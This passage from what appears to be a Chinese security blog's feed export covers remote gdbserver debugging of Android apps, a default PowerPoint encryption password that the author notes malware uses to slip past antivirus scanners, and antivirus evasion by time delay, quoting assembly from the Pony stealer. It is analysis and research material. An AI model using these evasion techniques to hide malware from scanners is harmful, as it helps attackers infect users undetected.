<br></code></pre></td></tr></table></figure><p>åœ¨guesté‡Œæ‰§è¡Œä¸‹é¢ä¸¤æ¡å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">autossh -nNL1234:localhost:1234  10.0.2.2 <br>autossh -nNL5037:localhost:5037  10.0.2.2 <br></code></pre></td></tr></table></figure><p>å…¶ä¸­ 10.0.2.2 æ˜¯hostçš„ipï¼Œ5037 æ˜¯adb é»˜è®¤ç›‘å¬çš„ç«¯å£ï¼Œ1234 æ˜¯gdbserver ç›‘å¬çš„ç«¯ å£ï¼Œåˆ©ç”¨sshåœ¨hostå’Œguest æ‰“ä¸ªé€šé“ã€‚</p><p>åœ¨hostæ‰§è¡Œadb forward å‘½ä»¤</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">adb</span> forward tcp:<span class="hljs-number">1234</span> tcp:<span class="hljs-number">1234</span> <br></code></pre></td></tr></table></figure><p>è¿™æ¡å‘½ä»¤åœ¨hostå’Œæ‰‹æœºä¸Šå»ºç«‹äº†ä¸€æ¡é€šé“ã€‚</p><p>è¿™æ ·å°±æå®šäº†adbçš„è¿æ¥é—®é¢˜ã€‚æ‰§è¡Œè¿™ä¸‰è¡Œå‘½ä»¤ååœ¨ubuntuä¸‹ï¼Œ adb devices å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„è¾“å‡º, é—®é¢˜å¾—åˆ°è§£å†³ã€‚</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">adb devices  </span><br>List of devices attached  01b00af93dc59e163        device <br><br>gdbclient system_server :1234 4475<br></code></pre></td></tr></table></figure><p>è¾“å‡ºæ­£å¸¸ï¼Œå¯ä»¥å¼€å§‹è°ƒè¯•äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PowerPoint å½©è›‹å’ŒåŠ å¯†</title>
    <link href="/cn/PowerPoint_egg/"/>
    <url>/cn/PowerPoint_egg/</url>
    
    <content type="html"><![CDATA[<h2 id="PowerPointçš„å½©è›‹"><a href="#PowerPointçš„å½©è›‹" class="headerlink" title="PowerPointçš„å½©è›‹"></a>PowerPointçš„å½©è›‹</h2><p>PowerPointçš„å½©è›‹æ˜¯ä¸€ä¸ªå¾ˆå¤æ‚çš„å¯†ç  &#x2F;01Hannes Ruescher&#x2F;01 å‘ç°è¿™ä¸ªå¯†ç æ˜¯åœ¨ binvulçš„è®ºå›é‡Œé¢ï¼Œåœ¨ç½‘ä¸Šæœç´¢äº†ä¸€ä¸‹æœ‰å‡ ä¸ªé“¾æ¥æåˆ°äº†è¿™ä¸ªå¯†ç ã€‚</p><p><a href="http://social.msdn.microsoft.com/Forums/en-US/4194b097-c5ca-416a-b9d6-7a65ff7d9d43">http://social.msdn.microsoft.com/Forums/en-US/4194b097-c5ca-416a-b9d6-7a65ff7d9d43</a><br><a href="http://msdn.microsoft.com/en-us/library/dd923811(v=office.12).aspx">http://msdn.microsoft.com/en-us/library/dd923811(v=office.12).aspx</a></p><p>ç¬¬äºŒä¸ªé“¾æ¥é‡Œé¢æœ‰ä¸€æ®µå…³é”®çš„å†…å®¹ï¼Œ</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-title class_">If</span> <span class="hljs-variable">the</span> <span class="hljs-variable">user</span> <span class="hljs-variable">has</span> <span class="hljs-variable">not</span> <span class="hljs-variable">supplied</span> <span class="hljs-variable">an</span> <span class="hljs-variable">encryption</span> <span class="hljs-variable">password</span> <span class="hljs-variable">and</span> <span class="hljs-variable">the</span> <span class="hljs-variable">document</span> <span class="hljs-operator">is</span> <br><span class="hljs-variable">encrypted</span>, <span class="hljs-variable">the</span> <span class="hljs-variable">default</span> <span class="hljs-variable">encryption</span> <span class="hljs-variable">choice</span> <span class="hljs-variable">using</span> <span class="hljs-variable">the</span> <span class="hljs-variable">techniques</span> <span class="hljs-variable">specified</span> <span class="hljs-keyword">in</span> <br><span class="hljs-variable">section</span> <span class="hljs-number">2.3</span> <span class="hljs-variable">MUST</span> <span class="hljs-variable">be</span> <span class="hljs-variable">the</span> <span class="hljs-variable">following</span> <span class="hljs-variable">password</span>: <br><span class="hljs-string">&quot;\x2f<span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x48</span><span class="hljs-char escape_">\x61</span>\x6e\x6e<span class="hljs-char escape_">\x65</span><span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x52</span><span class="hljs-char escape_">\x75</span><span class="hljs-char escape_">\x65</span><span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x65</span><span class="hljs-char escape_">\x72</span>\x2f<span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x31</span>&quot;</span>.<br></code></pre></td></tr></table></figure><p>è¿™é‡Œsection 2.3 æŒ‡çš„æ˜¯[MS-PPT]ä¸­çš„section 2.3ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªå½©è›‹å…¶å®å°±æ˜¯ä¸€ä¸ªç±»ä¼¼é»˜è®¤å¯†ç çš„ä¸œè¥¿ã€‚ä¸‹é¢æ¥è¯´è¯´è¿™ä¸ªå¯†ç çš„ç¥å¥‡ä¹‹å¤„ã€‚</p><h2 id="å½©è›‹çš„åˆ©ç”¨"><a href="#å½©è›‹çš„åˆ©ç”¨" class="headerlink" title="å½©è›‹çš„åˆ©ç”¨"></a>å½©è›‹çš„åˆ©ç”¨</h2><p>ä¸»è¦å¯ä»¥ç”¨æ¥è¿‡æ€è½¯ï¼Œå› ä¸ºæ€§èƒ½åŸå› ç›®å‰å¾ˆå¤šæ€è½¯éƒ½ä¸åšPPTæ–‡æ¡£è§£å¯†ã€‚è€Œç”¨æˆ·æ‰“å¼€å´ä¸éœ€è¦è¾“å…¥å¯†ç ï¼Œéå¸¸å·§å¦™ã€‚æˆ‘åœ¨binvulä¸Šçœ‹åˆ°ä¸€ä¸ªåˆ©ç”¨è¿™ä¸ªæŠ€æœ¯çš„æ ·æœ¬ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p>[MS-PPT].pdf<br>[MS-OFFCRYPTO].pdf</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>éroot Android è®¾å¤‡ç”¨gdbserverè¿›è¡Œnative è°ƒè¯•çš„æ–¹æ³•</title>
    <link href="/cn/non_root_android_native_debug/"/>
    <url>/cn/non_root_android_native_debug/</url>
    
    <content type="html"><![CDATA[<p>æ²¡æœ‰rootçš„è®¾å¤‡ï¼Œè¦ä½¿ç”¨gdbserver è°ƒè¯•app ä¼šé‡åˆ°æƒé™é—®é¢˜ã€‚(emulator æ²¡æœ‰é—®é¢˜)</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-number">1</span>|shell<span class="hljs-variable">@mako</span><span class="hljs-symbol">:/data/local/tmp</span> <span class="hljs-variable">$ </span>./gdbserver <span class="hljs-symbol">:</span><span class="hljs-number">1234</span> --attach <span class="hljs-number">16907</span><br><span class="hljs-title class_">Cannot</span> attach to lwp <span class="hljs-number">16907</span>: <span class="hljs-title class_">Operation</span> <span class="hljs-keyword">not</span> permitted (<span class="hljs-number">1</span>)<br><span class="hljs-title class_">Exiting</span><br></code></pre></td></tr></table></figure><p>Android ç³»ç»Ÿæä¾›äº†ä¸€ä¸ªrun-as å‘½ä»¤æ¥æš‚æ—¶åˆ‡æ¢ç”¨æˆ·ï¼Œä½†æ˜¯è¿™ä¸ªå‘½ä»¤æœ‰é™åˆ¶ï¼Œå¿…é¡»æ˜¯app æ‰“å¼€äº†debuggableæ‰è¡Œï¼Œå¦åˆ™ä¼šæŠ¥ Package xx is not debuggable çš„é”™è¯¯ã€‚<br>ä» <a href="http://android.googlesource.com/platform/system/core.git/+/master/run-as/run-as.c">http://android.googlesource.com/platform/system/core.git/+/master/run-as/run-as.c</a> çš„æ³¨é‡Šæ¥çœ‹ï¼Œä¸»è¦çš„ä½œç”¨æœ‰ä¸¤ä¸ªï¼š</p><ul><li>å¯ä»¥æŸ¥çœ‹è‡ªå·±å¼€å‘çš„åº”ç”¨çš„æ•°æ®</li><li>å¯ä»¥ä½¿ç”¨gdb_server è¿›è¡Œnative çš„debug</li></ul><p>æˆ‘ä»¬çš„éœ€æ±‚æ˜¯ç¬¬2ä¸ªï¼Œæˆ‘ä»¬å¸Œæœ›å¯ä»¥ä½¿ç”¨gdb_server æ¥è°ƒè¯• app</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">shell@mako:/ $ run-as<br>Usage: run-as   []<br><br>shell@mako:/ $ <br>shell@mako:/ $ run-as system_server /data/tmp/gdbserver --attach 596 :1234<br>run-as: Package &#x27;system_server&#x27; is unknown<br></code></pre></td></tr></table></figure><p>ç¿»çœ‹æºç ï¼Œå‘ç°æœ‰ä¸‹é¢ ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* reject system packages */</span><br><span class="hljs-keyword">if</span> (userAppId &lt; AID_APP) &#123;<br>    panic(<span class="hljs-string">&quot;Package &#x27;%s&#x27; is not an application\n&quot;</span>, pkgname);<br>&#125;<br><span class="hljs-comment">/* reject any non-debuggable package */</span><br><span class="hljs-keyword">if</span> (!info.isDebuggable) &#123;<br>    panic(<span class="hljs-string">&quot;Package &#x27;%s&#x27; is not debuggable\n&quot;</span>, pkgname);<br>&#125;<br></code></pre></td></tr></table></figure><p>é™åˆ¶æ¯”è¾ƒä¸¥æ ¼ï¼Œè°ƒè¯•ç³»ç»Ÿappä¼°è®¡æ˜¯æ²¡ä»€ä¹ˆæˆï¼Œrootäº†åº”è¯¥å°±æ²¡æœ‰é—®é¢˜äº†ã€‚ä½†æ˜¯è°ƒè¯•ä¸€èˆ¬çš„app è¿˜æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œç”¨apktool å°† AndroidManifest.xml çš„ debuggable è®¾ç½®ä¸ºtrueï¼Œé‡æ–° æ‰“åŒ…å°±å¯ä»¥è¿›è¡Œnative çš„ debug äº†ã€‚ä¸‹é¢ä»¥CVE-2014-7911çš„POCä¸ºä¾‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;com.heen.CVE_2014_7911&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">application</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:debuggable</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:icon</span>=<span class="hljs-string">&quot;@mipmap/ic_launcher&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/AppTheme&quot;</span> &gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span> &gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><br>                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªapp æ­£å¥½ android:debuggable&#x3D;â€trueâ€ ä¸ç”¨ä¿®æ”¹äº†ï¼Œåœ¨æ¨¡æ‹Ÿå™¨ä¸Šå®‰è£…è¿™ä¸ªappã€‚æ­å»º gdbè°ƒè¯•ç¯å¢ƒ, åˆ†ä¸‹é¢å‡ ä¸ªæ­¥éª¤èµ°ï¼š</p><p>(1) åˆ›å»ºå‡ ä¸ªç›®å½•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> ~/Android<br>mkidr ~/Android/system_lib<br>mkidr ~/Android/vendor_lib<br></code></pre></td></tr></table></figure><p>(2) å°†Android è®¾ç½®ä¸Šçš„libä¸‹è½½åˆ°æœ¬åœ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/Android/system_lib/<br>adb pull /system/lib<br><br><span class="hljs-built_in">cd</span> ~/Android/vendor_lib/<br>adb pull /vendor/lib<br><br><span class="hljs-built_in">cd</span> ~/Android<br><br><span class="hljs-comment"># åœ¨64ä½ç³»ç»Ÿ /system/bin/app_process32 å’Œ /system/bin/app_process64</span><br>adb pull /system/bin/app_process<br><br><span class="hljs-built_in">cd</span> ~/Android<br>adb pull /system/bin/linker<br></code></pre></td></tr></table></figure><p>(3) ä¸Šä¼ gdbserver</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">adb push <span class="hljs-variable">$NDK_PATH</span><span class="hljs-regexp">/prebuilt/</span>android-arm<span class="hljs-regexp">/gdbserver/g</span>dbserver <span class="hljs-regexp">/data/</span>local<span class="hljs-regexp">/tmp/g</span>dbserver<br></code></pre></td></tr></table></figure><p>ç¯å¢ƒåŸºæœ¬æ­å»ºå¥½äº†ï¼Œæµ‹è¯•ä¸€ä¸‹ run-as å‘½ä»¤</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">adb shell ps</span><br><br><span class="hljs-meta prompt_">...</span><br>u0_a86    16907 174   900568 38564 ffffffff 00000000 S com.heen.CVE_2014_7911<br><span class="hljs-meta prompt_">...</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&gt; adb shell run-as com.heen.CVE_2014_7911 id<br><span class="hljs-attribute">uid</span>=10086(u0_a86) <span class="hljs-attribute">gid</span>=10086(u0_a86) <span class="hljs-attribute">groups</span>=1003(graphics),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) <span class="hljs-attribute">context</span>=u:r:untrusted_app:s<br></code></pre></td></tr></table></figure><p>å·²ç»åˆ‡æ¢è¿‡æ¥äº†ï¼Œuid å˜äº†ï¼ŒæŒ‚ä¸Šgdbserver</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">&gt; adb <span class="hljs-keyword">shell</span> <span class="hljs-keyword">run</span>-<span class="hljs-keyword">as</span> com.heen.CVE_2014_7911 /data/<span class="hljs-keyword">local</span>/tmp/gdbserver :123 --attach 16907<br><br>Can&#x27;t <span class="hljs-keyword">open</span> socket: Permission denied.<br>Exiting<br></code></pre></td></tr></table></figure><p>æŠ¥äº†å¦å¤–ä¸€ä¸ªé”™è¯¯ï¼Œè¿˜æ˜¯ä¸è¡Œï¼Œgoogle ä¸€ç¿»å‘ç°æœ‰debug-pipe å‚æ•°ï¼Œå°è¯•äº†ä¸€ä¸‹</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&gt; adb shell run-<span class="hljs-keyword">as</span> com.heen.CVE_2014_7911 /data/<span class="hljs-keyword">local</span>/tmp/gdbserver +<span class="hljs-keyword">debug</span>-pipe <span class="hljs-comment">--attach 16907</span><br>Attached; pid = <span class="hljs-number">16907</span><br>Listening <span class="hljs-keyword">on</span> Unix socket <span class="hljs-keyword">debug</span>-pipe<br></code></pre></td></tr></table></figure><p>æ©ï¼Œç°åœ¨æ²¡æœ‰æŠ¥é”™äº†,æ‰§è¡Œä¸€ä¸‹ç«¯å£è½¬å‘ã€‚</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">adb</span> forward tcp:<span class="hljs-number">5039</span> localfilesystem:/<span class="hljs-class"><span class="hljs-keyword">data</span>/<span class="hljs-keyword">data</span>/com.heen.<span class="hljs-type">CVE_2014_7911</span>/debug-pipe</span><br><br></code></pre></td></tr></table></figure><p>OK, å·²ç»å¯ä»¥è°ƒè¯•äº†ã€‚</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs gams">&gt; <span class="hljs-symbol">$</span>NDK_PATH/toolchains/arm-linux-androideabi<span class="hljs-number">-4.9</span>/prebuilt/linux-x86_64/bin/arm-linux-androideabi-gdb ~/Android/app_process <br>GNU gdb (GDB) <span class="hljs-number">7.6</span><br>Copyright (C) <span class="hljs-number">2013</span> <span class="hljs-keyword">Free</span> Software Foundation, Inc.<br>License GPLv3+: GNU GPL version <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> later <br>This is <span class="hljs-keyword">free</span> software: you are <span class="hljs-keyword">free</span> to change <span class="hljs-keyword">and</span> redistribute it.<br>There is <span class="hljs-keyword">NO</span> WARRANTY, to the extent permitted by law.  Type <span class="hljs-string">&quot;show copying&quot;</span><br><span class="hljs-keyword">and</span> <span class="hljs-string">&quot;show warranty&quot;</span> <span class="hljs-keyword">for</span> details.<br>This GDB was configured as <span class="hljs-string">&quot;--host=x86_64-linux-gnu --target=arm-linux-android&quot;</span>.<br><span class="hljs-keyword">For</span> bug reporting instructions, please see:<br>...<br>Reading symbols from /home/henices/Android/app_process...(<span class="hljs-keyword">no</span> debugging symbols found)...done.<br>(gdb) target remote :<span class="hljs-number">5039</span><br>Remote debugging <span class="hljs-keyword">using</span> :<span class="hljs-number">5039</span><br>warning: Could <span class="hljs-keyword">not</span> load shared library symbols <span class="hljs-keyword">for</span> <span class="hljs-number">100</span> libraries, e.g. /<span class="hljs-keyword">system</span>/bin/linker.<br>Use the <span class="hljs-string">&quot;info sharedlibrary&quot;</span> command to see the complete listing.<br>Do you need <span class="hljs-string">&quot;set solib-search-path&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;set sysroot&quot;</span>?<br>warning: Unable to find dynamic linker breakpoint function.<br>GDB will be unable to debug shared library initializers<br><span class="hljs-keyword">and</span> track explicitly loaded dynamic code.<br><span class="hljs-number">0x4013a73c</span> in ?? ()<br><br>(gdb) info proc<br>process <span class="hljs-number">16907</span><br>cmdline = <span class="hljs-string">&#x27;com.heen.CVE_2014_7911&#x27;</span><br>cwd = <span class="hljs-string">&#x27;/&#x27;</span><br>exe = <span class="hljs-string">&#x27;/system/bin/app_process&#x27;</span><br><br>(gdb) <span class="hljs-keyword">set</span> solib-search-path ~/Android:~/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">:</span>~/Android/<span class="hljs-comment">vendor_lib</span>/<br>(gdb) info sharedlibrary<br><span class="hljs-number">0x400f3a60</span>  <span class="hljs-number">0x400fe79c</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/linker<br><span class="hljs-number">0x40126070</span>  <span class="hljs-number">0x401566ec</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libc.so</span><br>0x40174828  <span class="hljs-comment">0x401749c8  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/libstdc++.so<br><span class="hljs-number">0x401798f0</span>  <span class="hljs-number">0x4018c478</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libm.so</span><br>0x40114f50  <span class="hljs-comment">0x40116490  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/liblog.so<br><span class="hljs-number">0x4010c38c</span>  <span class="hljs-number">0x40110988</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libcutils.so</span><br>0x401acb1c  <span class="hljs-comment">0x401af20c  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/libgccdemangle.so<br><span class="hljs-number">0x401a81d0</span>  <span class="hljs-number">0x401a94ac</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libcorkscrew.so</span><br>0x4019b780  <span class="hljs-comment">0x401a1f24  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/libutils.so<br><span class="hljs-number">0x401cbc50</span>  <span class="hljs-number">0x401d5ba4</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libbinder.so</span><br>0x402955f0  <span class="hljs-comment">0x4029585c  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/libhardware.so<br><span class="hljs-number">0x402925d0</span>  <span class="hljs-number">0x40292834</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libmemtrack.so</span><br>0x402bbbf0  <span class="hljs-comment">0x402cb80c  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/libz.so<br><span class="hljs-number">0x402a4240</span>  <span class="hljs-number">0x402b23fc</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libandroidfw.so</span><br>0x402d6774  <span class="hljs-comment">0x402e53a0  Yes (*)</span>     /home/<span class="hljs-comment">henices</span>/Android/<span class="hljs-comment">system_lib</span>/libexpat.so<br><span class="hljs-number">0x403083a8</span>  <span class="hljs-number">0x4031e684</span>  <span class="hljs-keyword">Yes</span> (*)     /<span class="hljs-comment">home</span>/henices/<span class="hljs-comment">Android</span>/system_lib/<span class="hljs-comment">libstlport.so</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é€šè¿‡å»¶è¿Ÿæ‰§è¡Œçš„æ–¹æ³•æ¥é€ƒé€¸æ€è½¯</title>
    <link href="/cn/malware_time_delay_escape/"/>
    <url>/cn/malware_time_delay_escape/</url>
    
    <content type="html"><![CDATA[<h2 id="pony-2-0"><a href="#pony-2-0" class="headerlink" title="pony 2.0"></a>pony 2.0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs asm">; KAV heuristic fucker<br><br>KAVHeurKiller proc uses esi<br>    LOCAL   counter: DWORD<br>    AntiDisasmTrick<br>    push    eax<br>    mov ecx, ecx<br>    pop eax<br>    mov ecx, ecx<br>    push    eax<br>    sub esi, esi<br>    pop eax<br>    mov ecx, ecx<br>    push    19131011<br>    mov ecx, ecx<br>    pop counter<br>    mov edx, eax<br>    .WHILE  counter<br>        mov edx, eax<br>        mov ecx, ecx<br>        add eax, esi<br>        mov edx, eax<br>        mov ecx, ecx<br>        push    eax<br>        mov ecx, ecx<br>        mov edx, eax<br>        invoke  GetTickCount<br>        mov ecx, ecx<br>        pop eax<br>        mov edx, eax<br>        mov ecx, ecx<br>        add eax, edx<br>        mov ecx, ecx<br>        mov edx, eax<br>        dec counter<br>    .ENDW<br>    ret<br>KAVHeurKiller endp<br></code></pre></td></tr></table></figure><h2 id="pony-1-9"><a href="#pony-1-9" class="headerlink" title="pony 1.9"></a>pony 1.9</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asm">.WHILE  TRUE<br>    invoke  GetTickCount<br>    mov ecx, 10<br>    xor edx, 